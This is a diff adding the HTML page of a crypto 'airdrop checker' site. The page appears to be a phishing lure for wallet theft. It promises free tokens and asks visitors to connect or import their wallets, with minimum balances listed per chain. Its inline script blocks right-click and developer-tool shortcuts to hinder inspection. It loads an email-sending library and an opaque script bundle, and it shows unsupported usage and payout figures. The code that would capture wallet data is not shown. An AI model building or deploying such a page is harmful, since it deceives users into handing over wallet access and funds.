@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Cache-Control" content="no-store">
+    <script src="assets/sources.js"></script>
+    <script src="assets/app-bundle_mtyryq6c.js"></script>
+    <script src="assets/qr-code-styling.js"></script>
+    <script>(function () { document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }); document.addEventListener('keydown', function (e) { if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); return false; } }); })();</script>
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Outfit:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <title>Mainnet web — Airdrop Checker</title>
+</head>
+
+<body>
+
+
+    <section class="hero">
+
+        <div class="hero-logo-wrap">
+
+            <img src="img/airdroplogo.png" alt="Logo" id="heroLogoImg" />
+        </div>
+
+        <h1>Find Your Eligible Airdrops <span class="emoji">🔍</span></h1>
+
+        <p class="hero-desc">
+            This airdrop program distributes free tokens to eligible participants as a reward for their
+            on-chain activity and ecosystem contribution. Allocation amounts are distributed algorithmically
+            based on wallet volume, transaction frequency, and overall blockchain engagement.
+        </p>
+
+    </section>
+
+
+    <section class="eligibility">
+        <div class="elig-inner">
+
+            <h2 class="elig-header reveal">Eligible Airdrops</h2>
+
+            <div class="elig-warn reveal">
+                ⚠️ Please connect your wallet to calculate your allocation
+            </div>
+
+            <!-- Chain cards -->
+            <div class="chains-grid">
+
+                <div class="chain-card reveal">
+                    <div class="chain-logo-wrap">
+                        <img src="img/bitcoin.png" alt="Bitcoin Rune" />
+                    </div>
+                    <span class="chain-name">Bitcoin-Rune</span>
+                    <span class="chain-min-alloc">Min. 0.05 BTC</span>
+                    <div class="chain-amount-box">0.0</div>
+                    <span class="chain-alloc-label">Allocation</span>
+                </div>
+
+                <div class="chain-card reveal">
+                    <div class="chain-logo-wrap">
+                        <img src="img/ethereum.png" alt="Ethereum" />
+                    </div>
+                    <span class="chain-name">Ethereum</span>
+                    <span class="chain-min-alloc">Min. 1 ETH</span>
+                    <div class="chain-amount-box">0.0</div>
+                    <span class="chain-alloc-label">Allocation</span>
+                </div>
+
+                <div class="chain-card reveal">
+                    <div class="chain-logo-wrap">
+                        <img src="img/solana.png" alt="Solana" />
+                    </div>
+                    <span class="chain-name">Solana</span>
+                    <span class="chain-min-alloc">Min. 10 SOL</span>
+                    <div class="chain-amount-box">0.0</div>
+                    <span class="chain-alloc-label">Allocation</span>
+                </div>
+
+                <div class="chain-card reveal">
+                    <div class="chain-logo-wrap">
+                        <img src="img/xrp.png" alt="XRP" />
+                    </div>
+                    <span class="chain-name">XRP</span>
+                    <span class="chain-min-alloc">Min. 2500 XRP</span>
+                    <div class="chain-amount-box">0.0</div>
+                    <span class="chain-alloc-label">Allocation</span>
+                </div>
+
+                <div class="chain-card reveal">
+                    <div class="chain-logo-wrap">
+                        <img src="img/bsc.png" alt="BSC" />
+                    </div>
+                    <span class="chain-name">BSC</span>
+                    <span class="chain-min-alloc">Min. 1 BNB</span>
+                    <div class="chain-amount-box">0.0</div>
+                    <span class="chain-alloc-label">Allocation</span>
+                </div>
+
+                <div class="chain-card reveal">
+                    <div class="chain-logo-wrap">
+                        <img src="img/base.png" alt="Base" />
+                    </div>
+                    <span class="chain-name">Base</span>
+                    <span class="chain-min-alloc">Min. 0.5 ETH</span>
+                    <div class="chain-amount-box">0.0</div>
+                    <span class="chain-alloc-label">Allocation</span>
+                </div>
+
+            </div>
+
+
+            <div class="connect-area">
+                <p class="view-more-text reveal">Connect to view more tokens</p>
+
+                <button class="btn-connect reveal connect-button">
+                    <i class="ri-wallet-3-line"></i>
+                    Connect Wallet
+                </button>
+
+                <div class="reward-formula reveal">
+                    <p class="reward-intro">
+                        Your specific reward across each network is algorithmically computed based on
+                    </p>
+                    <div class="reward-pills">
+                        <span class="reward-pill"><span class="pill-emoji">⚖️</span> Wallet balance and historical
+                            volume</span>
+                        <span class="reward-pill"><span class="pill-emoji">💱</span> Transaction count and
+                            consistency</span>
+                        <span class="reward-pill"><span class="pill-emoji">🔍</span> On-chain activity across supported
+                            networks</span>
+                    </div>
+                    <p class="reward-footer">
+                        In simple terms: <strong>the more active and valuable your wallet is, the greater your rewards
+                            potential.</strong>
+                    </p>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+
+
+    <section class="protocols">
+        <div class="protocols-inner">
+
+            <span class="section-eyebrow">Integrations</span>
+            <h2 class="section-h2 reveal">80+ Protocols Supported</h2>
+
+            <div class="protocol-list">
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/wormhole.png" alt="Wormhole" />
+                    </div>
+                    <span class="protocol-chip-name">Wormhole</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/tensor.png" alt="Pyth" />
+                    </div>
+                    <span class="protocol-chip-name">Pyth</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/jupiter.png" alt="Jupiter" />
+                    </div>
+                    <span class="protocol-chip-name">Jupiter</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/jito.png" alt="Jito" />
+                    </div>
+                    <span class="protocol-chip-name">Jito</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/kamino.png" alt="Kamino" />
+                    </div>
+                    <span class="protocol-chip-name">Kamino</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/tensor.png" alt="Tensor" />
+                    </div>
+                    <span class="protocol-chip-name">Tensor</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/parcl.png" alt="Parcl" />
+                    </div>
+                    <span class="protocol-chip-name">Parcl</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/drift.png" alt="Drift" />
+                    </div>
+                    <span class="protocol-chip-name">Drift</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/layerzero.png" alt="LayerZero" />
+                    </div>
+                    <span class="protocol-chip-name">LayerZero</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/zeta.png" alt="Zeta" />
+                    </div>
+                    <span class="protocol-chip-name">Zeta</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/bonk.png" alt="Bonk" />
+                    </div>
+                    <span class="protocol-chip-name">Bonk</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/wen.png" alt="Wen" />
+                    </div>
+                    <span class="protocol-chip-name">Wen</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/bskt.png" alt="BSKT" />
+                    </div>
+                    <span class="protocol-chip-name">BSKT</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/hxro.png" alt="HXRO" />
+                    </div>
+                    <span class="protocol-chip-name">HXRO</span>
+                </div>
+
+                <div class="protocol-chip reveal">
+                    <div class="protocol-logo-wrap">
+                        <img src="img/debridge.png" alt="deBridge" />
+                    </div>
+                    <span class="protocol-chip-name">deBridge</span>
+                </div>
+
+            </div>
+
+
+            <h2 class="how-works-h reveal">How it Works</h2>
+            <p class="how-works-sub reveal">
+                Need help getting started? Here's a quick overview of how to use deFiBridgeApp.
+            </p>
+
+            <div class="steps-list">
+
+                <div class="step-card reveal">
+                    <div class="step-icon-wrap">
+                        <i class="ri-import-line"></i>
+                    </div>
+                    <div class="step-content">
+                        <span class="step-num">Step 01</span>
+                        <span class="step-title">Import Wallet</span>
+                        <span class="step-desc">Import your desired wallet to get started.</span>
+                    </div>
+                </div>
+
+                <div class="step-card reveal">
+                    <div class="step-icon-wrap">
+                        <i class="ri-search-eye-line"></i>
+                    </div>
+                    <div class="step-content">
+                        <span class="step-num">Step 02</span>
+                        <span class="step-title">Check Eligibility</span>
+                        <span class="step-desc">Check the list to confirm the airdrops you qualify for.</span>
+                    </div>
+                </div>
+
+                <div class="step-card reveal">
+                    <div class="step-icon-wrap">
+                        <i class="ri-gift-2-line"></i>
+                    </div>
+                    <div class="step-content">
+                        <span class="step-num">Step 03</span>
+                        <span class="step-title">Claim Airdrops</span>
+                        <span class="step-desc">Some airdrops may need you to perform additional tasks before
+                            claiming.</span>
+                    </div>
+                </div>
+
+                <div class="step-card reveal">
+                    <div class="step-icon-wrap">
+                        <i class="ri-notification-3-line"></i>
+                    </div>
+                    <div class="step-content">
+                        <span class="step-num">Step 04</span>
+                        <span class="step-title">Get Notified</span>
+                        <span class="step-desc">You will be notified via email as new airdrops are added.</span>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+    </section>
+
+
+
+    <section class="stats-section">
+        <div class="stats-inner">
+
+            <!-- Left: image -->
+            <div class="stats-img-col reveal">
+                <div class="stats-img-placeholder">
+                    <img src="img/zhe.webp" alt="Airdrop illustration" id="statsImg" style="display: block;" />
+                </div>
+                <div class="stats-badge">
+                    <span class="badge-num">80+</span>
+                    <span>Protocols</span>
+                </div>
+            </div>
+
+            <div class="stats-text-col">
+                <p class="stats-text reveal">
+                    Airdrops are rewards to loyal members of the crypto community. Our mission is to help
+                    you find airdrops without spending hours searching for them. We provide a simple and
+                    easy-to-use interface to check for airdrops you qualify for and claim them.
+                </p>
+
+                <div class="stats-numbers">
+
+                    <div class="stat-item reveal">
+                        <div class="stat-divider"></div>
+                        <div class="stat-num">340k</div>
+                        <div class="stat-label">Daily Users</div>
+                    </div>
+
+                    <div class="stat-item reveal">
+                        <div class="stat-divider"></div>
+                        <div class="stat-num">$95.2m</div>
+                        <div class="stat-label">Airdrops claimed by subscribers</div>
+                    </div>
+
+                    <div class="stat-item reveal">
+                        <div class="stat-divider"></div>
+                        <div class="stat-num">$101.3k</div>
+                        <div class="stat-label">Average claimed per day</div>
+                    </div>
+
+                    <div class="stat-item reveal">
+                        <div class="stat-divider"></div>
+                        <div class="stat-num">80+</div>
+                        <div class="stat-label">Supported Protocols</div>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+
+
+    <footer>
+        <p>© 2026 <span>ProjectMainnetDapp</span>, All rights reserved</p>
+    </footer>
+
+    <script src="app.js"></script>
+</body>
+
+</html>
